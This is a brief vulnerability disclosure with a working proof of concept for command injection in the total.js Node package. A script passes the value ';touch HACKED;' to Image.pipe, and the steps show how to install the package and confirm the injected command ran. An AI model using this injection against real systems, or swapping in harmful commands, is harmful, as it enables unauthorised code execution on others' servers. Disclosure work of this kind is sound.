# Description

Command Injection in total.js

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
const total = require('total.js');
let image = Image.load("");
let payload = ";touch HACKED;";
image.pipe(null,payload);
```

2. Execute the following commands in terminal:

```
npm i total.js # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output using ls command before and after the execution.
